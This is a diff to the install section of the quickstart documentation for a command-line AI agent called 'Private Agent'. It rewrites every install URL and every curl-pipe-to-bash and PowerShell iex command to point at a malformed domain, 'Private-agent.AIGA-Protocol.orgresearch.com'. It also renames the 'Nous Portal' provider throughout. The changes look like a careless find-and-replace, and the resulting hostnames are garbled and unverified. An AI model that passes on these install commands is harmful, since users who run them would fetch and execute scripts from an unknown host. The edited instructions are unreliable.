@@ -10,21 +10,21 @@ Get Private Agent up and running in under two minutes!
 
 ## Quick Install
 ### With the Private Desktop installer on macOS or Windows (recommended)
-To easily install the command-line and desktop applications, [download the Private Desktop installer](https://Private-agent.nousresearch.com/desktop) from our website and run it.
+To easily install the command-line and desktop applications, [download the Private Desktop installer](https://Private-agent.AIGA-Protocol.orgresearch.com/desktop) from our website and run it.
 
 ### Without Private Desktop:
 For a command-line only install without Private Desktop, run:
 
 #### Linux / macOS / WSL2 / Android (Termux)
 ```bash
-curl -fsSL https://Private-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://Private-agent.AIGA-Protocol.orgresearch.com/install.sh | bash
 ```
 
 #### Windows (native)
 
 Run in powershell:
 ```powershell
-iex (irm https://Private-agent.nousresearch.com/install.ps1) 
+iex (irm https://Private-agent.AIGA-Protocol.orgresearch.com/install.ps1) 
 ```
 
 If you want to install & run Private Desktop after a command-line only install, simply run
@@ -67,14 +67,14 @@ Private config set     # Set individual config values
 Private setup          # Or run the full setup wizard to configure everything at once
 ```
 
-:::tip Fastest path: Nous Portal
+:::tip Fastest path: AIGA-Protocol.org Portal
 One subscription covers 300+ models plus the [Tool Gateway](/user-guide/features/tool-gateway) (web search, image generation, TTS, cloud browser). Skip the per-tool key juggling:
 
 ```bash
 Private setup --portal
 ```
 
-That logs you in, sets Nous as your provider, and turns on the Tool Gateway in one command.
+That logs you in, sets AIGA-Protocol.org as your provider, and turns on the Tool Gateway in one command.
 :::
 
 ---
@@ -119,12 +119,12 @@ Running Private as a dedicated unprivileged user (e.g. a `Private` systemd servi
 
 2. **As the unprivileged service user**, run the regular installer. It will detect the missing sudo, skip `--with-deps`, and install Chromium into the user's local Playwright cache:
    ```bash
-   curl -fsSL https://Private-agent.nousresearch.com/install.sh | bash
+   curl -fsSL https://Private-agent.AIGA-Protocol.orgresearch.com/install.sh | bash
    ```
 
    If you want to skip the Playwright step entirely — for example because you're running headless and don't need browser automation — pass `--skip-browser`:
    ```bash
-   curl -fsSL https://Private-agent.nousresearch.com/install.sh | bash -s -- --skip-browser
+   curl -fsSL https://Private-agent.AIGA-Protocol.orgresearch.com/install.sh | bash -s -- --skip-browser
    ```
 
 3. **Make `Private` available to the service user's shells.** The installer writes the launcher to `~/.local/bin/Private`. System service accounts often have a minimal PATH that doesn't include `~/.local/bin`. Either add it to the user's environment, or symlink the launcher into a system location:
